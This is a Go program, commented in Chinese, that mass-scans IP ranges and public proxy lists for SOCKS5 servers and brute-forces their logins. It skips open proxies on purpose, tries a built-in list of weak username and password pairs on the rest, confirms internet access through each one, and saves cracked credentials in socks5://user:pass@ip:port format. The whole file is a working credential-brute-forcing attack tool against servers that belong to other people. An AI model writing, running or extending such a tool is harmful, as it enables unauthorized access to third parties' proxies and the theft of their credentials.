package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/cheggaaa/pb/v3"
	"golang.org/x/net/proxy"
	"golang.org/x/time/rate"
)

// ==================== 配置 ====================
var (
	weakPasswordsSlice [][2]string
	countryCache       sync.Map
	seenProxies        sync.Map
	validCount         int64
	detailFile, validFile, logFile *os.File
	countryCacheFile = "country_cache.json"
	limiter          = rate.NewLimiter(rate.Every(time.Second/100), 100)
	detailMu         sync.Mutex
	validMu          sync.Mutex
	detailWriter *bufio.Writer
	validWriter  *bufio.Writer
)

// ==================== 内置 URL 列表 ====================
var builtInURLs = []string{
    // Proxifly (GitHub CDN, updates every 5 minutes)
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",

	// Proxy-list (update at least 10 times daily, TXT format)
	"https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite",

	// Proxy-list (update every 30 minutes)
	"https://raw.githubusercontent.com/iplocate/free-proxy-list/refs/heads/main/protocols/socks5.txt",

	"https://sockslist.us/Raw",
}

// ==================== 结果结构 ====================
type Result struct {
	IP       string
	Port     int
	Scheme   string
	Latency  int
	ExportIP string
	Country  string
	Auth     string
	IsWeak   bool
}

// ==================== 扫描任务 ====================
type scanTask struct {
	IP   string
	Port int
}

// ==================== 主函数 ====================
func main() {
	ipRange := flag.String("ip-range", "", "IP range: 192.168.1.1-192.168.1.255 or CIDR")
	portInput := flag.String("port", "", "Ports: 1080 / 80 8080 / 1-65535")
	threads := flag.Int("threads", 0, "Max concurrent connections")
	timeout := flag.Duration("timeout", 0, "Timeout per request (e.g. 5s)")
	urlInputs := flag.String("url", "", "URLs to fetch (comma-separated)")
	flag.Parse()

	// 解析启动参数 URL 列表
	var finalURLs []string
	if *urlInputs != "" {
		for _, u := range strings.Split(*urlInputs, ",") {
			u = strings.TrimSpace(u)
			if u != "" {
				finalURLs = append(finalURLs, u)
			}
		}
	}

	loadCountryCache()
	defer saveCountryCache()

	var err error
	logFile, err = os.OpenFile("scan.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()
	log.SetOutput(io.MultiWriter(os.Stdout, logFile))
	log.SetFlags(log.LstdFlags)
	log.Printf("[*] 扫描开始: %s", time.Now().Format("2006-01-02 15:04:05"))

	defaultStart := "157.254.32.0"
	defaultEnd := "157.254.52.255"
	defaultPort := "1080"
	defaultThreads := 1000
	defaultTimeout := 5 * time.Second

	finalIPRange := *ipRange
	finalPortInput := *portInput
	finalThreads := *threads
	finalTimeout := *timeout

	if finalThreads == 0 {
		finalThreads = promptInt("最大并发数（默认: "+strconv.Itoa(defaultThreads)+"):", defaultThreads)
	}
	if finalTimeout == 0 {
		finalTimeout = promptDuration("超时时间（如 5s，默认: 5s）: ", defaultTimeout)
	}

	weakPasswordsSlice = loadWeakPasswords("weak_passwords.txt")

	detailFile, err = os.OpenFile("result_detail.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("打开 result_detail.txt 失败: ", err)
	}
	validFile, err = os.OpenFile("proxy_valid.txt", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("打开 proxy_valid.txt 失败: ", err)
	}
	// 用 bufio 包装
	detailWriter = bufio.NewWriter(detailFile)
	validWriter = bufio.NewWriter(validFile)
	defer func() {
		detailWriter.Flush()
		validWriter.Flush()
		detailFile.Close()
		validFile.Close()
	}()
	
	// 定时 flush
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			detailMu.Lock()
			detailWriter.Flush()
			detailMu.Unlock()
			validMu.Lock()
			validWriter.Flush()
			validMu.Unlock()
		}
	}()

	log.Printf("[*] 最大并发: %d", finalThreads)
	log.Printf("[*] 超时时间: %v", finalTimeout)

	taskChan := make(chan scanTask, finalThreads*2)
	ctx, cancel := context.WithCancel(context.Background())
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		log.Println("[!] 收到中断信号，正在优雅退出...")
		cancel()
	}()

	// ==================== 进度条 ====================
	bar := pb.New(0)
	bar.SetWriter(io.MultiWriter(os.Stdout, logFile))
	bar.Set("prefix", "Scanning ")
	bar.Start()

	// ==================== 生成任务 ====================
	go func() {
		defer close(taskChan)
		// ① 内置 URL
		if ok, count := loadTasksFromURLs(ctx, builtInURLs, finalPortInput, taskChan); ok {
			bar.AddTotal(int64(count))
			log.Println("[+] 已成功从内置 URL 加载任务")
			return
		}
		// ② 启动参数 URL
		if len(finalURLs) > 0 {
			if ok, count := loadTasksFromURLs(ctx, finalURLs, finalPortInput, taskChan); ok {
				bar.AddTotal(int64(count))
				log.Println("[+] 已从启动参数 URL 加载任务")
				return
			}
		}
		// ③ 交互式输入
		if finalIPRange == "" {
			finalIPRange = promptIPRange(defaultStart, defaultEnd)
		}
		ipChan, err := ipGenerator(ctx, finalIPRange)
		if err != nil {
			log.Fatalf("无效的 IP 范围: %v", err)
		}
		if finalPortInput == "" {
			finalPortInput = prompt("端口（默认: "+defaultPort+"): ", defaultPort)
		}
		ports, err := parsePorts(finalPortInput)
		if err != nil {
			log.Fatalf("无效的端口输入: %v", err)
		}
		ipCount := calculateIPCount(finalIPRange)
		bar.AddTotal(int64(ipCount * len(ports)))
		for ip := range ipChan {
			for _, port := range ports {
				select {
				case taskChan <- scanTask{IP: ip, Port: port}:
				case <-ctx.Done():
    				return
				case <-time.After(time.Second):
    				log.Printf("[WARN] 任务发送超时: %s:%d", ip, port)
				}

			}
		}
	}()

	// ==================== Worker 池 ====================
	var wg sync.WaitGroup
	for i := 0; i < finalThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for task := range taskChan {
				key := task.IP + ":" + strconv.Itoa(task.Port)

				if _, loaded := seenProxies.LoadOrStore(key, true); loaded {
					bar.Increment()
					continue
				}

				result := scanProxy(ctx, task.IP, task.Port, finalTimeout)
				if result.Scheme != "" {
					writeResult(result)
				}

				bar.Increment()
			}
		}()
	}

	wg.Wait()
	bar.Finish()
	log.Printf("[+] 已保存 %d 个代理 → proxy_valid.txt", atomic.LoadInt64(&validCount))
}

// ==================== calculateIPCount ====================
func calculateIPCount(r string) int {
	if strings.Contains(r, "/") {
		_, ipnet, err := net.ParseCIDR(r)
		if err != nil {
			return 0
		}
		ones, bits := ipnet.Mask.Size()
		return 1 << (bits - ones)
	}
	parts := strings.Split(r, "-")
	if len(parts) != 2 {
		return 0
	}
	start := net.ParseIP(strings.TrimSpace(parts[0])).To4()
	end := net.ParseIP(strings.TrimSpace(parts[1])).To4()
	if start == nil || end == nil {
		return 0
	}
	count := 0
	for ip := copyIP(start); compareIP(ip, end) <= 0; incIP(ip) {
		count++
	}
	return count
}

// ==================== 任务加载函数 ====================
func loadTasksFromURLs(ctx context.Context, urls []string, portInput string, taskChan chan<- scanTask) (bool, int) {
    totalTasks := 0
    loadedAny := false

    for _, u := range urls {
        if ctx.Err() != nil {
            break
        }

        ok, count := streamAddrsFromURL(ctx, u, portInput, taskChan)
        totalTasks += count

        if ok {
            log.Printf("[+] URL 加载成功: %s (%d 个任务)", u, count)
            loadedAny = true
        } else {
            log.Printf("[-] URL 无有效数据: %s", u)
        }
    }

    return loadedAny, totalTasks
}

func streamAddrsFromURL(ctx context.Context, u, portInput string, taskChan chan<- scanTask) (bool, int) {
	log.Printf("[*] 正在从 URL 加载代理: %s", u)
	client := &http.Client{Timeout: 15 * time.Second}

	resp, err := client.Get(u)
	if err != nil {
		log.Printf("[!] URL 获取失败: %v", err)
		return false, 0
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[!] URL 状态码: %d", resp.StatusCode)
		return false, 0
	}

	defaultPorts, _ := parsePorts(portInput)
	scanner := bufio.NewScanner(resp.Body)

	loaded := false
	taskCount := 0

	for scanner.Scan() {
		select {
		case <-ctx.Done():
			return loaded, taskCount
		default:
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		// 去掉协议前缀
		line = strings.TrimPrefix(line, "socks5://")
		line = strings.TrimPrefix(line, "http://")
		line = strings.TrimPrefix(line, "https://")

		// 提取 IP 和端口
		var ipStr, portStr string
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			ipStr = strings.TrimSpace(parts[0])
			portStr = strings.TrimSpace(parts[1])
		} else {
			// 没有端口则跳过
			continue
		}

		if net.ParseIP(ipStr) == nil {
			continue
		}

		var ports []int
		if port, err := strconv.Atoi(portStr); err == nil {
			ports = []int{port}
		} else {
			ports = defaultPorts
		}

		for _, p := range ports {
			taskChan <- scanTask{IP: ipStr, Port: p}
			taskCount++
		}

		loaded = true
	}

	return loaded, taskCount
}

// ==================== 扫描代理====================
func scanProxy(ctx context.Context, ip string, port int, timeout time.Duration) Result {
	result := Result{IP: ip, Port: port}
	addr := fmt.Sprintf("%s:%d", ip, port)

	// 方案一：先多次尝试空密码，任何一次成功都判定为公开代理并丢弃
	if checkIfOpenProxy(ctx, ip, port, timeout) {
		log.Printf("[INFO] 检测到公开无认证代理，已丢弃: %s:%d", ip, port)
		return Result{} // 直接丢弃整个节点
	}

	// 开始弱密码爆破
	for _, pair := range weakPasswordsSlice {
		select {
		case <-ctx.Done():
			return result
		default:
		}

		auth := &proxy.Auth{User: pair[0], Password: pair[1]}
		dialer, err := proxy.SOCKS5("tcp", addr, auth, proxy.Direct)
		if err != nil {
			continue
		}

		ok, lat, exportIP := testSocks5WithDialer(ctx, dialer, timeout)
		if !ok || !isPublicIP(exportIP) {
			continue
		}

		// 外网访问测试（和你原来完全一致）
		if !testInternetAccess(ctx, dialer, timeout) {
			log.Printf("[INFO] 弱密码成功但外网访问失败，丢弃: %s:%d (%s:%s)", ip, port, pair[0], pair[1])
			continue
		}

		// 方案二：反向验证 —— 用空密码再试一次，看看是不是其实根本不需要密码
		emptyDialer, _ := proxy.SOCKS5("tcp", addr, &proxy.Auth{}, proxy.Direct) // 空认证
		if emptyDialer != nil {
			if openOk, _, _ := testSocks5WithDialer(ctx, emptyDialer, timeout); openOk {
				log.Printf("[WARN] 弱密码成功但空密码也能通，判定为公开代理丢弃: %s:%d (%s:%s)", 
					ip, port, pair[0], pair[1])
				return Result{} // 整条代理直接丢弃，防止公开代理混进来
			}
		}

		// 到这里说明：真的需要这个用户名密码才能通
		result.Scheme = "socks5"
		result.Latency = lat
		result.ExportIP = exportIP
		result.Country = getCountry(exportIP)
		if result.Country == "XX" {
			result.Country = getCountry(ip) // 回退查询节点IP的国家
		}
		result.Auth = fmt.Sprintf("%s:%s", pair[0], pair[1])
		result.IsWeak = true

		return result // 成功找到一个真正的弱密码代理，立即返回
	}

	return Result{} // 所有密码都试完都没成功
}

// ==================== 方案一：多次空密码检测公开代理（最多3次，绝对安全） ====================
func checkIfOpenProxy(ctx context.Context, ip string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", ip, port)
	const maxAttempts = 3 // 可自行改为 2~5

	for i := 0; i < maxAttempts; i++ {
		if i > 0 {
			time.Sleep(time.Millisecond * time.Duration(200*(i+1))) // 轻微退避
		}

		select {
		case <-ctx.Done():
			return false
		default:
		}

		dialer, err := proxy.SOCKS5("tcp", addr, &proxy.Auth{}, proxy.Direct) // 空认证
		if err != nil {
			continue
		}

		ok, _, exportIP := testSocks5WithDialer(ctx, dialer, timeout)
		if !ok || !isPublicIP(exportIP) {
			continue
		}

		// 额外确认能正常访问外网
		if testInternetAccess(ctx, dialer, timeout) {
			return true // 只要有一次彻底成功，就判定为公开代理
		}
	}
	return false // 连续3次都失败，才认为不是公开代理
}

// ==================== SOCKS5 测试（支持 ctx） ====================
func testSocks5WithDialer(ctx context.Context, dialer proxy.Dialer, timeout time.Duration) (bool, int, string) {
	if err := limiter.Wait(ctx); err != nil {
		return false, 0, ""
	}

	start := time.Now()
	dialCh := make(chan net.Conn, 1)
	errCh := make(chan error, 1)

	go func() {
		conn, err := dialer.Dial("tcp", "ifconfig.me:80")
		if err != nil {
			errCh <- err
			return
		}
		dialCh <- conn
	}()

	var conn net.Conn
	var err error
	select {
	case <-ctx.Done():
		return false, 0, ""
	case err = <-errCh:
		return false, 0, ""
	case c := <-dialCh:
		conn = c
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	fmt.Fprintf(conn, "GET /ip HTTP/1.1\r\nHost: ifconfig.me\r\nConnection: close\r\n\r\n")
	
	buf, err := io.ReadAll(conn)
	if err != nil {
    	return false, 0, ""
	}
	lines := strings.Split(string(buf), "\n")
	if len(lines) == 0 {
    	return false, 0, ""
	}
	exportIP := strings.TrimSpace(lines[len(lines)-1]) // 最后一行通常是 IP
	
	if exportIP == "" || !isPublicIP(exportIP) {
		return false, 0, ""
	}
	return true, int(time.Since(start).Milliseconds()), exportIP
}

// ==================== 外网访问检测 ====================
var defaultTransport = &http.Transport{
    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
}

func testInternetAccess(ctx context.Context, dialer proxy.Dialer, timeout time.Duration) bool {
    // 克隆默认 transport
    transport := defaultTransport.Clone()
    
    // 设置代理 dialer（推荐用 DialContext）
    transport.DialContext = func(c context.Context, network, addr string) (net.Conn, error) {
        return dialer.Dial(network, addr)
    }

    // 创建 HTTP 客户端
    client := &http.Client{
        Timeout:   timeout,
        Transport: transport,
    }

    testURLs := []string{
        "https://www.google.com/generate_204",
        "http://httpbin.org/status/204",
        "https://cloudflare.com/cdn-cgi/trace",
    }

    for i, u := range testURLs {
        req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
        if err != nil {
            log.Printf("[DEBUG] 创建请求失败（URL %d: %s）: %v", i+1, u, err)
            continue
        }

        resp, err := client.Do(req)
        if err != nil {
            log.Printf("[DEBUG] 访问失败（URL %d: %s）: %v", i+1, u, err)
            continue
        }

        body, readErr := io.ReadAll(resp.Body)
        resp.Body.Close()

        if readErr != nil {
            log.Printf("[DEBUG] 读取响应体失败（URL %d: %s）: %v", i+1, u, readErr)
            continue
        }

        // 接受 200 / 204
        if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent {
            if resp.StatusCode == http.StatusOK && len(body) == 0 {
                log.Printf("[DEBUG] 响应体为空（URL %d: %s）", i+1, u)
                continue
            }
            log.Printf("[DEBUG] 外网访问成功（URL %d: %s，状态码: %d）", i+1, u, resp.StatusCode)
            return true
        }

        log.Printf("[DEBUG] 无效状态码（URL %d: %s，状态码: %d）", i+1, u, resp.StatusCode)
    }

    log.Printf("[DEBUG] 所有外网访问测试失败")
    return false
}

// ==================== 公网 IP 判断 ====================
func isPublicIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	return !ip.IsPrivate() && !ip.IsLoopback() && !ip.IsUnspecified()
}

// ==================== 国家信息查询 ====================
func getCountry(ip string) string {
	if v, ok := countryCache.Load(ip); ok {
		return v.(string)
	}
	country := queryCountry(ip)
	countryCache.Store(ip, country)
	return country
}

func queryCountry(ip string) string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/" + ip + "?fields=countryCode")
	if err != nil {
		return "XX"
	}
	defer resp.Body.Close()

	var data struct {
		CountryCode string `json:"countryCode"`
	}
	if json.NewDecoder(resp.Body).Decode(&data) != nil || data.CountryCode == "" {
		return "XX"
	}
	return data.CountryCode
}

// ==================== 写入结果（实时 flush） ====================
func writeResult(r Result) {
	if r.Auth == "" {
		// 没有账号密码，跳过写入
		return
	}

	detailMu.Lock()
	fmt.Fprintf(detailWriter, "%s:%d [%s] %s %dms %s\n", r.IP, r.Port, r.Scheme, r.Auth, r.Latency, r.Country)
	detailMu.Unlock()

	// 写入有效节点文件，格式：socks5://user:pass@ip:port#国家代码
	validMu.Lock()
	fmt.Fprintf(validWriter, "%s://%s@%s:%d#%s\n",
		r.Scheme, r.Auth, r.IP, r.Port, r.Country)
	validMu.Unlock()

	atomic.AddInt64(&validCount, 1)
}

// ==================== 交互输入 ====================
func prompt(msg, def string) string {
	fmt.Print(msg)
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		input := strings.TrimSpace(scanner.Text())
		if input != "" {
			return input
		}
	}
	return def
}

func promptInt(msg string, def int) int {
	s := prompt(msg, strconv.Itoa(def))
	i, err := strconv.Atoi(s)
	if err != nil || i <= 0 {
		return def
	}
	return i
}

func promptDuration(msg string, def time.Duration) time.Duration {
	s := prompt(msg, def.String())
	d, err := time.ParseDuration(s)
	if err != nil {
		return def
	}
	return d
}

func promptIPRange(start, end string) string {
	s := prompt("起始 IP（默认: "+start+"): ", start)
	e := prompt("结束 IP（默认: "+end+"): ", end)
	return s + "-" + e
}

// ==================== IP/端口解析 ====================
func ipGenerator(ctx context.Context, r string) (<-chan string, error) {
    if strings.Contains(r, "/") {
        return cidrGenerator(ctx, r)
    }
    return rangeDashGenerator(ctx, r)
}

func cidrGenerator(ctx context.Context, cidr string) (<-chan string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	ch := make(chan string)
	go func() {
    defer close(ch)
    for ip := copyIP(ipnet.IP.Mask(ipnet.Mask)); ipnet.Contains(ip); incIP(ip) {
        select {
        case ch <- ip.String():
        case <-ctx.Done():
            return
        }
    }
}()
	return ch, nil
}

func rangeDashGenerator(ctx context.Context, r string) (<-chan string, error) {
	parts := strings.Split(r, "-")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid IP range format")
	}
	start := net.ParseIP(strings.TrimSpace(parts[0])).To4()
	end := net.ParseIP(strings.TrimSpace(parts[1])).To4()
	if start == nil || end == nil {
		return nil, fmt.Errorf("invalid IPv4 address")
	}
	ch := make(chan string)
	go func() {
		defer close(ch)
		for ip := copyIP(start); compareIP(ip, end) <= 0; incIP(ip) {
    		select {
    		case ch <- ip.String():
    		case <-ctx.Done():
        	return
    		}
		}
	}()
	return ch, nil
}

func copyIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func compareIP(a, b net.IP) int {
	a4 := a.To4()
	b4 := b.To4()
	if a4 == nil || b4 == nil {
		return strings.Compare(a.String(), b.String())
	}
	for i := 0; i < 4; i++ {
		if a4[i] < b4[i] {
			return -1
		} else if a4[i] > b4[i] {
			return 1
		}
	}
	return 0
}

func parsePorts(input string) ([]int, error) {
    var ports []int
    input = strings.ReplaceAll(input, ",", " ")

    for _, p := range strings.Fields(input) {
        if strings.Contains(p, "-") {
            r := strings.Split(p, "-")
            if len(r) != 2 {
                continue
            }
            s, err := strconv.Atoi(strings.TrimSpace(r[0]))
            if err != nil || s < 1 || s > 65535 {
                continue
            }
            e, err := strconv.Atoi(strings.TrimSpace(r[1]))
            if err != nil || e < 1 || e > 65535 {
                continue
            }
            if s > e {
                s, e = e, s
            }
            for i := s; i <= e; i++ {
                ports = append(ports, i)
            }
        } else {
            port, err := strconv.Atoi(strings.TrimSpace(p))
            if err != nil || port < 1 || port > 65535 {
                log.Printf("非法端口: %s", p)
                continue
            }
            ports = append(ports, port)
        }
    }
    return ports, nil
}

// ==================== 弱密码加载 ====================
func loadWeakPasswords(file string) [][2]string {
	data, err := os.ReadFile(file)
	if err != nil {
		log.Printf("Warning: failed to load weak passwords file: %v", err)
		return [][2]string{		
			{"123456", "123456"}, {"password", "password"}, {"admin", "admin"},
			{"admin", "123456"}, {"root", "root"}, {"root", "123456"},
			{"123456789", "123456789"}, {"qwerty", "qwerty"}, {"12345", "12345"},
			{"12345678", "12345678"}, {"111111", "111111"}, {"user", "user"},
			{"user", "password"}, {"123", "123"}, {"proxy", "proxy"}, {"socks5", "socks5"},
			{"1234567", "1234567"}, {"iloveyou", "iloveyou"}, {"123123", "123123"},
			{"000000", "000000"}, {"welcome", "welcome"}, {"secret", "secret"},
			{"dragon", "dragon"}, {"monkey", "monkey"}, {"football", "football"},
			{"letmein", "letmein"}, {"sunshine", "sunshine"}, {"baseball", "baseball"},
			{"princess", "princess"}, {"admin123", "admin123"}, {"superman", "superman"},
			{"guest", "guest"}, {"", "123456"}, {"admin", ""}, {"", "admin"},
			{"test", "test"}, {"demo", "demo"},
		}
	}
	var list [][2]string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			list = append(list, [2]string{parts[0], parts[1]})
		}
	}
	if len(list) > 0 {
		return list
	}
	return [][2]string{{"guest", "guest"}, {"admin", "admin"}}
}

// ==================== 国家缓存 ====================
func loadCountryCache() {
	data, err := os.ReadFile(countryCacheFile)
	if err != nil {
		return
	}
	var m map[string]string
	if err := json.Unmarshal(data, &m); err != nil {
		return
	}
	for k, v := range m {
		countryCache.Store(k, v)
	}
}

func saveCountryCache() {
	m := make(map[string]string)
	countryCache.Range(func(key, value any) bool {
		if k, ok := key.(string); ok {
			if v, ok := value.(string); ok {
				m[k] = v
			}
		}
		return true
	})
	data, _ := json.MarshalIndent(m, "", "  ")
	_ = os.WriteFile(countryCacheFile, data, 0644)
}
